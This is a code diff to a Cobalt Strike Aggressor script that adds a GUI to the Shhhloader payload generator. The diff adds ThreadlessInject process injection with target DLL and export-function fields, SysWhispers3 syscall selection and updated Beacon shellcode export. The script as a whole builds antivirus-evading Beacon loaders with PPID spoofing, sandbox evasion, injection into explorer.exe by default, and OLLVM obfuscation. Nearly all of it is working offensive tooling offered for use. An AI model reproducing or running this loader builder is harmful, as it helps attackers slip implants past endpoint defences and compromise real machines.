@@ -22,6 +22,12 @@ $ollvm = "";
 $outname = "";
 $payload_type = "";
 
+#Variables for threadless inject
+$cp = "";
+$td = "";
+$ef = "";
+$ti = "";
+
 # Variables for flags
 $np = "";
 $vb = "";
@@ -30,7 +36,7 @@ $dll = "";
 $dp = "";
 $sa = "";
 $sb = "";
-$gs = "";
+$sc = "";
 $ol = "";
 $we = "";
 $proc = "";
@@ -73,23 +79,30 @@ popup Shhhloader {
 sub Shhhloader {
     local('$dialog %defaults');
     %defaults["injection_process"] = "explorer.exe";
+    %defaults["td"] = "ntdll.dll";
+    %defaults["ef"] = "NtClose";
 
     $dialog = dialog("Shhhloader Payload Generator", %defaults, &mainCallback);
-    dialog_description($dialog, "AV Might Hear Us!!! (#) for optional, (*) for required options.");
+    dialog_description($dialog, "AV Might Hear Us!!! (#) for optional, (*) for required options, (!) for ThreadlessInject");
     drow_listener_stage($dialog, "listener", "(*) Listener: ");
     drow_combobox($dialog, "payload_type", "(*) Payload Type: ", @("Stageless", "Staged"));
-    drow_combobox($dialog, "injection_method", "(*) Injection Method: ", @("QueueUserAPC", "ModuleStomping", "ProcessHollow", "EnumDisplayMonitors", "RemoteThreadContext", "RemoteThreadSuspended", "CurrentThread"));
-    drow_combobox($dialog, "syscall_method", "(*) Syscall Method: ", @("SysWhispers2", "GetSyscallStub"));
+    drow_combobox($dialog, "injection_method", "(*) Injection Method: ", @("QueueUserAPC", "ThreadlessInject" ,"ModuleStomping", "ProcessHollow", "EnumDisplayMonitors", "RemoteThreadContext", "RemoteThreadSuspended", "CurrentThread"));
+    
+    drow_combobox($dialog, "syscall_method", "(*) Syscall Method: ", @("SysWhispers3","SysWhispers2", "GetSyscallStub","None"));
     drow_combobox($dialog, "encoding_method", "(*) Encoding Method: ", @("XOR", "English Words"));
     drow_combobox($dialog, "file_type", "(*) File Type: ", @("exe", "dll"));
-    drow_combobox($dialog, "sandbox", "(#) Sandbox Evasion: ", @("domain", "hostname", "username", "sleep", "none"));
+    drow_combobox($dialog, "sandbox", "(#) Sandbox Evasion: ", @("sleep", "hostname", "username", "domain", "none"));
     drow_text($dialog, "sandboxarg", "(#) Sanbox Argument: ");
     drow_text($dialog, "injection_process", "(#) Injection Process: ");
     drow_text($dialog, "outname", "(#) Output File Name: ");
     drow_text($dialog, "dllproxy", "(#) DLL Proxy: ");
+    drow_text($dialog, "td", "(!) Target DLL: ")
+    drow_text($dialog, "ef", "(!) Export Function: ")
+    drow_checkbox($dialog, "cp", "(!) Create Process: ");
     drow_checkbox($dialog, "ollvm", "(#) Enable Obfuscator-LLVM (OLLVM)");
     drow_checkbox($dialog, "noppid", "(#) Disable PPID Spoofing");
     drow_checkbox($dialog, "verbose", "(#) Verbose");
+
     dbutton_action($dialog, "Generate Payload");
     dbutton_help($dialog, "https://github.com/icyguider/Shhhloader");
     dialog_show($dialog);
@@ -127,7 +140,18 @@ sub mainCallback {
     $ollvm = $3["ollvm"];
     $outname = $3["outname"];
     $payload_type = $3["payload_type"];
+    $syscall_method = $3["syscall_method"];
+    $td = $3["td"];
+    $ef = $3["ef"];
+    $cp = $3["cp"];
 
+    if ($injection_method eq "ThreadlessInject") {
+        if (($td eq "") || ($ef eq "")) {
+            show_message("The arguments for ThreadlessInject must be specified! Try again.");
+            exit();
+        }
+    }
+    
     if (($sandbox eq "domain") || ($sandbox eq "user") || ($sandbox eq "hostname")) {
         if ($sandboxarg eq "") {
             show_message("Selected sandbox evasion method requires an argument! Try again.");
@@ -161,9 +185,7 @@ sub mainCallback {
     {
         $sb = "-s $sandbox "
     }
-    if ($syscall_method eq "GetSyscallStub") {
-        $gs = "-g ";
-    }
+    
     if ($ollvm eq "true"){
         $ol = "-l ";
     }
@@ -173,10 +195,17 @@ sub mainCallback {
     if ($outname eq "") {
         $outname = "a.$ext";
     }
+    
+    if ($cp eq "true"){
+        $ti = "-td $td -ef $ef -cp"
+    }
+    else {
+        $ti = "-td $td -ef $ef "
+    }
 
     $proc = "-p $injection_process";
     if ($payload_type eq "Stageless") {
-        $shellcode = artifact_payload($3["listener"], "raw", "x64");
+        $shellcode = artifact_payload($3["listener"], "raw", "x64", "process", "Direct");
     }
     if ($payload_type eq "Staged") {
         $shellcode = artifact_stager($3["listener"], "raw", "x64");
@@ -189,7 +218,7 @@ sub GeneratePayload {
     writeb($handle, $shellcode);
     closef($handle);
 
-    $build_cmd = "python3 Shhhloader.py beacon.bin -m $injection_method $sb$sa$proc -o $outname $np$vb$ns$dll$gs$ol$we$dp";
+    $build_cmd = "python3 Shhhloader.py beacon.bin -m $injection_method $ti -sc $syscall_method $sb$sa$proc -o $outname $np$vb$ns$dll$ol$we$dp";
 
     #Uncomment to debug call to python builder
     #show_message($build_cmd);
